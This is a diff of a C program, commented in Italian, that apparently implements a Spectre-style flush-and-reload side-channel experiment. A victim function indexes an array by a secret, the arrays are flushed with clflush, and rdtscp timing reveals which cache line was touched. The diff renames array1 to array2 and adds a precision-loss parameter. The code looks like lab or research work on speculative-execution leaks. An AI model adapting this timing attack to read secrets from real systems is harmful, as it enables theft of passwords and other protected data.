@@ -19,7 +19,7 @@
 uint8_t unused1[64];
 unsigned int secret[SIZE];
 uint8_t unused2[64];
-unsigned int array1[SIZE];
+unsigned int array2[SIZE];
 uint8_t unused3[64];
 unsigned int passwordDigest[SIZE];
 
@@ -27,7 +27,7 @@ uint8_t temp = 0; /* per non far ottimizzare victim_function() dal compilatore *
 
 void victim_function(int userID, int pwd) {
 	if (pwd == passwordDigest[userID]) {
-		temp &= array1[secret[userID]];
+		temp = array2[secret[userID]];
 	}
 }
 
@@ -43,6 +43,7 @@ int main(int argn, char *argv[]) {
 	// 1 - number of runs
 	// 2 - number of tests
 	// 3 - cache hit threshold
+	// 4 - precision loss
 
 	if (argn - 1 != 4) {
 		printf("Illegal number of arguments. It must be 4 (#round, #test, #threshold, precisionLoss\n");
@@ -50,13 +51,13 @@ int main(int argn, char *argv[]) {
 	}
 
 	// parametri
-	int numberOfRuns = strtol(argv[1], NULL, 10); // numero di run per ogni test
+	int numberOfRuns = strtol(argv[1], NULL, 10); // numero di round per ogni test
 	int numberOfTest = strtol(argv[2], NULL, 10); // numero di test
 	int cacheHitThreshold = strtol(argv[3], NULL, 10); // soglia per cache hit
 	int precisionLoss = strtol(argv[4], NULL, 10); // precisione dei risultati
 
 	int debug = 0; // modalita con stampe
-	int blocks = sizeof(array1[0]) * 8; // numero di bit occupati da ogni posizione dell'array
+	int blocks = sizeof(array2[0]) * 8; // numero di bit occupati da ogni posizione dell'array
 	int delta = CACHELINE / blocks; // numero di elementi in una line
 	int class = SIZE / delta + 1; // classi di risultati
 
@@ -83,7 +84,7 @@ int main(int argn, char *argv[]) {
 		// inizializzo casualmente gli array
 		for (int i = 0; i < SIZE; i++) {
 			passwordDigest[i] = rand() % SIZE;
-			array1[i] = rand() % SIZE;
+			array2[i] = rand() % SIZE;
 			secret[i] = rand() % SIZE;
 		}
 
@@ -104,7 +105,7 @@ int main(int argn, char *argv[]) {
 
 				// flushing array1 e passwordDigest dalla cache
 				for (int i = 0; i < SIZE; i++) {
-					_mm_clflush(&array1[i]);
+					_mm_clflush(&array2[i]);
 					_mm_clflush(&passwordDigest[i]);
 				}
 
@@ -119,7 +120,7 @@ int main(int argn, char *argv[]) {
 
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
-				timeReg = array1[l * delta];
+				timeReg = array2[l * delta];
 				time2 = __rdtscp(&timeReg) - time1;
 
 				for (volatile int z = 0; z < 100; z++) {
